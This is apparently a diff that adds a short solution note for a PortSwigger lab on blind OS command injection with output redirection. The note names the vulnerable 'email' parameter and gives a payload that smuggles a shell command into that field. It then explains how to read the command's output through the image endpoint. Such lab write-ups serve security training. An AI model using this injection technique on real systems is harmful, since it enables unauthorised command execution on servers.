@@ -1,1 +1,16 @@
+Lab link: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
 
+***Analyze the vulnerability***
+    Type: Blind OS command injection
+    Vulnerability location: 'feedback functionality' at '/feedback' path
+    vulnerable parameter: 'email' parameter in post request at '/feedback/submit'
+
+    Directory location serve by application: '/var/www/images/'
+    how to access the files stored in accessible directory: '/image?filename=output.txt'
+
+***Exploitation***
+  payload="me@me.com & whoami > /var/www/images/output.txt #"
+1. Inject url_encoded($payload) at 'email' parameter in captured post request to '/feedback/submit' path
+2. Access, the 'ouput.txt' by visiting '/image?filename=output.txt'
+    
+    
